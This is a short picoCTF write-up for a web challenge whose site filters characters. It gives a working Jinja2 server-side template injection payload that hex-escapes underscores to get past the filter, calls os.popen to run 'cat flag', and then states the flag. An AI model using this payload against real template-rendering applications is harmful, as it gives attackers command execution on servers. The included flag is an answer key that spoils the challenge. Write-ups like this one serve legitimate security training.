https://play.picoctf.org/practice/challenge/488
## Description
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:53916/)!

## Solution
1. Go to the website.
2. Use the next payload to execute a remote command and read the flag with the command `cat flag`:
	```
	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
	```
	We are basically encoding the ---->  _,.[]  <---- into hexanumbers
	![](../../../../images/Pasted%20image%2020251005103006.png)
	The flag is: `picoCTF{sst1_f1lt3r_byp4ss_63b833cd}`


## Additional notes
## References
https://onsecurity.io/article/server-side-template-injection-with-jinja2/
